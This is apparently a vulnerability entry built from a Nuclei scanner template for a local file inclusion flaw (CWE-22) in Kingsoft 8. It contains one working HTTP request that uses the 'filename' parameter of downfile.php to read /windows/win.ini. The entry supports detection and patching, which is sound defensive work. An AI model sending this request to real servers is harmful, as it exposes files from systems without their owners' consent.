# Vulnerability: Kingsoft 8 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`kingsoft-v8-file-read.yaml`)

## Description
Kingsoft 8 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/htmltopdf/downfile.php?filename=/windows/win.ini
```

